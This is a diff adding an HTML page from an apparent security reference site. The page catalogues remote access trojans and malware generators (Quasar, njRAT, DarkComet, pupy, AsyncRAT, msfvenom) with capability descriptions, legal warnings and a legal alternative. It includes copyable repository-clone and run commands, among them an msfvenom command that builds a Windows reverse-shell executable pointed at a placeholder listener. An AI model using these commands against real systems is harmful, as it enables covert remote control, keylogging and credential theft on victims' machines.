@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="theme-color" content="#050810">
+  <title>RATs / Malware — FORBIDDEN TOOLS</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+<div id="nav-placeholder"></div>
+
+<div class="page-hero">
+  <div class="page-hero__grid"></div><div class="page-hero__glow"></div>
+  <div class="container container--narrow">
+    <div class="page-hero__badge">CATEGORY 04</div>
+    <h1 class="page-hero__title">RATs / Malware<br><span>/ Spyware</span></h1>
+    <p class="page-hero__sub">Remote access trojans, keyloggers, and malware generators. <strong class="text-red">Federal crime to deploy worldwide.</strong> Antivirus quarantines these the moment they are downloaded.</p>
+  </div>
+</div>
+
+<main class="container" style="padding-top:24px">
+  <div class="alert alert--info mb-md" data-reveal>
+    <span class="alert__icon">ℹ</span>
+    <span><span class="chip chip--install">BLUE = Install Command</span> &nbsp; <span class="chip chip--run">PURPLE = Run Command</span> &nbsp;&nbsp; Click any command to copy.</span>
+  </div>
+
+  <div class="tbl-wrap" data-reveal>
+    <table>
+      <thead><tr>
+        <th>TOOL</th>
+        <th class="col-does">WHAT IT DOES WHEN USED</th>
+        <th>WHY ILLEGAL</th>
+        <th class="col-install">INSTALL COMMAND</th>
+        <th class="col-run">RUN COMMAND</th>
+        <th class="col-result">OUTCOME</th>
+      </tr></thead>
+      <tbody>
+        <tr>
+          <td class="td-tool">Quasar RAT</td>
+          <td class="td-does">Once the victim runs the client executable (disguised as a legitimate program), Quasar establishes a persistent reverse connection to your C2 server. You gain full remote desktop viewing and control, file manager access, keylogger output, clipboard capture, webcam/microphone access, password extraction from browsers, and shell command execution — all through a clean Windows GUI dashboard.</td>
+          <td class="td-why">Full unauthorized remote control. Criminal under CFAA and Computer Misuse Act worldwide.</td>
+          <td><code class="chip chip--install" data-copy="git clone github.com/quasar/Quasar">git clone github.com/quasar/Quasar</code></td>
+          <td><code class="chip chip--run" data-copy="QuasarServer.exe">QuasarServer.exe  # Windows C2 panel</code></td>
+          <td><span class="tag tag--blocked">❌ GitHub blocks — AV quarantines</span></td>
+        </tr>
+        <tr>
+          <td class="td-tool">njRAT</td>
+          <td class="td-does">Deploys a small stub on the victim machine that sends a reverse connection to your server. Provides real-time keylogging with window titles, screenshot capture every N seconds, microphone recording, access to all files on the victim's drives, ability to open/close the CD tray (classic "proof of infection" trick), and full remote shell execution with command history.</td>
+          <td class="td-why">Keylogging + remote access + data exfiltration. Used by APT groups. Federal crime to deploy.</td>
+          <td><code class="chip chip--install" data-copy="# Underground sources only — not on public repos">Underground sources only</code></td>
+          <td><code class="chip chip--run" data-copy="njrat.exe /port:5552">njrat.exe /port:5552</code></td>
+          <td><span class="tag tag--blocked">❌ All AV quarantine on download</span></td>
+        </tr>
+        <tr>
+          <td class="td-tool">DarkComet</td>
+          <td class="td-does">One of the original feature-rich RATs. Records all keystrokes with window context, takes screenshots on demand or on schedule, accesses webcam and microphone silently, downloads and executes additional payloads, steals saved browser passwords, modifies the Windows registry for persistence, and communicates home via encrypted channel to evade basic network monitoring.</td>
+          <td class="td-why">Spyware with surveillance capabilities. Used in nation-state attacks. Illegal to possess in most countries.</td>
+          <td><code class="chip chip--install" data-copy="# Underground sources only">Underground sources only</code></td>
+          <td><code class="chip chip--run" data-copy="DarkComet-RAT.exe">DarkComet-RAT.exe</code></td>
+          <td><span class="tag tag--blocked">❌ Illegal to possess — AV removes it</span></td>
+        </tr>
+        <tr>
+          <td class="td-tool">pupy</td>
+          <td class="td-does">Cross-platform Python RAT with a reflective DLL loader — runs entirely in memory without touching disk, bypassing most antivirus solutions. Supports Windows, macOS, and Linux targets. Provides interactive shell, file operations, screenshot, webcam, keylogger, network pivoting through the victim, and port forwarding. Can migrate between processes to maintain persistence.</td>
+          <td class="td-why">Memory-resident RAT designed to evade AV. Used in advanced attacks. Deploying = federal crime.</td>
+          <td><code class="chip chip--install" data-copy="git clone github.com/n1nj4sec/pupy">git clone github.com/n1nj4sec/pupy</code></td>
+          <td><code class="chip chip--run" data-copy="pupysh.py -t ssl">pupysh.py -t ssl</code></td>
+          <td><span class="tag tag--blocked">❌ AV flags it — deploying = federal crime</span></td>
+        </tr>
+        <tr>
+          <td class="td-tool">AsyncRAT</td>
+          <td class="td-does">Open-source .NET-based RAT with encrypted C2 communications using SSL/TLS. Features real-time remote desktop, keylogger, clipboard monitor, file manager, process manager, registry editor, and a client builder that lets you configure the C2 IP, port, and a custom startup key. Also includes a built-in crypter to pack the client and reduce AV detection rates.</td>
+          <td class="td-why">Encrypted C2 with built-in evasion. Deploying on any system without consent = criminal offense.</td>
+          <td><code class="chip chip--install" data-copy="# Underground sources only">Underground sources only</code></td>
+          <td><code class="chip chip--run" data-copy="AsyncRAT.exe --port 6606">AsyncRAT.exe --port 6606</code></td>
+          <td><span class="tag tag--blocked">❌ Blocked by AV/EDR — illegal to deploy</span></td>
+        </tr>
+        <tr>
+          <td class="td-tool">msfvenom (malicious payload)</td>
+          <td class="td-does">Generates standalone executable files, shellcode, or script-based payloads that, when run on a victim machine, connect back to a Metasploit listener. Once connected, you get a full Meterpreter shell: file system access, process injection, privilege escalation, credential harvesting via hashdump, pivot to other machines on the network, and persistent backdoor installation.</td>
+          <td class="td-why">Generates malware — deploying the output on any real system (not your own test lab) is a federal crime.</td>
+          <td><code class="chip chip--install" data-copy="# Built into Metasploit — sudo apt install metasploit-framework">Built into Metasploit</code></td>
+          <td><code class="chip chip--run" data-copy="msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f exe > shell.exe</code></td>
+          <td><span class="tag tag--warn">⚠ Generates file — deploying = federal crime</span></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="alert alert--danger" data-reveal>
+    <span class="alert__icon">🚨</span>
+    Antivirus, EDR, and GitHub all block these tools. <strong>Deploying any RAT is a federal crime worldwide</strong> — even on systems you own if they belong to an organization. There is zero legitimate bug bounty use case.
+  </div>
+
+  <div class="mt-lg" data-reveal>
+    <h3 class="text-green" style="font-family:var(--display);letter-spacing:2px;margin-bottom:12px">✅ LEGAL ALTERNATIVE</h3>
+    <div class="card card--green">
+      <p style="margin-bottom:10px;font-size:13px;color:var(--dim)">Use <strong class="text-green">interactsh</strong> for out-of-band callbacks to detect blind SSRF, XXE, RCE, and SSTI — legal and purpose-built for bug bounty.</p>
+      <code class="chip chip--install" data-copy="go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest" style="font-size:12px;display:block;margin-bottom:6px">go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest</code>
+      <code class="chip chip--install" data-copy="interactsh-client -v" style="font-size:12px;display:block">interactsh-client -v  # gives you a safe OOB callback URL</code>
+    </div>
+  </div>
+
+  <div class="page-nav" data-reveal>
+    <a href="wifi.html" class="btn btn--outline">← WIFI ATTACKS</a>
+    <a href="stuffing.html" class="btn btn--outline">CRED STUFFING →</a>
+  </div>
+  <div style="height:60px"></div>
+</main>
+
+<div id="footer-placeholder"></div>
+<script src="js/components.js"></script>
+</body></html>
